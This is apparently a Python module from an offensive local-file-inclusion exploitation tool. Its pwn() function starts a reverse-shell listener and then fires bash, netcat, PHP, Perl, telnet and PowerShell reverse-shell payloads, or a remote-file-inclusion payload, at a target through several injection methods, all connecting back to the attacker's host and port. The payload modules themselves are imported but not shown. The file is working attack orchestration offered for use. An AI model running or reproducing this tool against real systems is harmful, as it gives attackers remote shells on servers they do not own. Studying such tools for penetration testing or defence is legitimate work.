"""Import exploit modules"""
import threading

from src.attacks.bash import exploit_bash
from src.attacks.nc import exploit_nc
from src.attacks.php import exploit_php
from src.attacks.perl import exploit_perl
from src.attacks.telnet import exploit_telnet
from src.attacks.rfi import exploit_rfi
from src.attacks.powershell import exploit_powershell
from src.utils.arguments import init_args
from src.servers.LFIshell import start_listener


def pwn(exploit):
    """pwn"""
    args  = init_args()
    # Starting the reverse shell listener
    listener_thread = threading.Thread(target=start_listener, args=(args['lport'],))
    listener_thread.start()

    ip = args['lhost']
    port = args['lport']
    method = exploit["ATTACK_METHOD"]

    if method == "INPUT":
        exploit["OS"] = "linux"
        if exploit["OS"] == "linux":
            exploit_bash(exploit, "INPUT", ip, port)
            exploit_nc(exploit, "INPUT", ip, port)
            exploit_php(exploit, "INPUT", ip, port)
            exploit_perl(exploit, "INPUT", ip, port)
            exploit_telnet(exploit, "INPUT", ip, port)
        else:
            exploit_powershell(exploit, "INPUT", ip, port)

    elif method == "DATA":
        if exploit["OS"] == "linux":
            exploit_bash(exploit, "DATA", ip, port)
            exploit_nc(exploit, "DATA", ip, port)
            exploit_php(exploit, "DATA", ip, port)
            exploit_perl(exploit, "DATA", ip, port)
            exploit_telnet(exploit, "DATA", ip, port)
        else:
            exploit_powershell(exploit, "DATA", ip, port)

    elif method == "EXPECT":
        if exploit["OS"] == "linux":
            exploit_bash(exploit, "EXPECT", ip, port)
            exploit_nc(exploit, "EXPECT", ip, port)
            exploit_php(exploit, "EXPECT", ip, port)
            exploit_perl(exploit, "EXPECT", ip, port)
            exploit_telnet(exploit, "EXPECT", ip, port)
        else:
            exploit_powershell(exploit, "EXPECT", ip, port)

    elif method == "RFI":
        if exploit_rfi(exploit, "RFI", ip, port):
            return

    elif method == "TRUNC":
        if exploit["OS"] == "linux":
            exploit_bash(exploit, "TRUNC", ip, port)
            exploit_nc(exploit, "TRUNC", ip, port)
            exploit_php(exploit, "TRUNC", ip, port)
            exploit_perl(exploit, "TRUNC", ip, port)
            exploit_telnet(exploit, "TRUNC", ip, port)
        else:
            exploit_powershell(exploit, "TRUNC", ip, port)

    elif method == "CMD":
        if exploit["OS"] == "linux":
            exploit_bash(exploit, "CMD", ip, port)
            exploit_nc(exploit, "CMD", ip, port)
            exploit_php(exploit, "CMD", ip, port)
            exploit_perl(exploit, "CMD", ip, port)
            exploit_telnet(exploit, "CMD", ip, port)
        else:
            exploit_powershell(exploit, "CMD", ip, port)

    # Join the listener thread, with 10 second timeout in case deadlock, unexpected expections or other errors occur in the meantime
    # This will make sure that execution continues no matter the occurring issues in the thread
    listener_thread.join(timeout=10)

    return
